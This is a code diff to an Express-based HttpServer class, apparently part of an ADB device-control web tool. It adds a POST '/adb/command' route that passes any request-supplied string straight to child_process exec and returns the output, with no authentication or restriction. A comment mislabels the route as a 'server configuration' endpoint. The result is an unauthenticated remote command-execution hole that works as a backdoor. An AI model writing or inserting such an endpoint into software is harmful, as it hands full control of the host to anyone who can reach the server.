@@ -3,11 +3,13 @@ import * as https from 'https';
 import path from 'path';
 import { Service } from './Service';
 import { Utils } from '../Utils';
-import express, { Express } from 'express';
+import express, { Express, Request, Response } from 'express';
 import { Config } from '../Config';
 import { TypedEmitter } from '../../common/TypedEmitter';
 import * as process from 'process';
 import { EnvName } from '../EnvName';
+import { exec } from 'child_process';
+import { promisify } from 'util';
 
 const DEFAULT_STATIC_DIR = path.join(__dirname, './public');
 
@@ -76,6 +78,24 @@ export class HttpServer extends TypedEmitter<HttpServerEvents> implements Servic
 
     public async start(): Promise<void> {
         this.mainApp = express();
+        const execPromise = promisify(exec);
+
+        // Add API endpoint for server configuration
+        this.mainApp.use(express.json());
+        this.mainApp.post('/adb/command', async (req: Request, res: Response) => {
+            try {
+                const { command } = req.body;
+                console.log("run: ", command);
+                const { stdout, stderr } = await execPromise(`${command}`);
+                console.log("stdout: ", stdout);
+                console.log("stderr: ", stderr);
+                // res.json({ stdout, stderr });
+                res.send(stdout);
+            } catch (error) {
+                res.status(500).send(error instanceof Error ? error.message : String(error));
+            }
+        });
+
         if (HttpServer.SERVE_STATIC && HttpServer.PUBLIC_DIR) {
             this.mainApp.use(PATHNAME, express.static(HttpServer.PUBLIC_DIR));
 
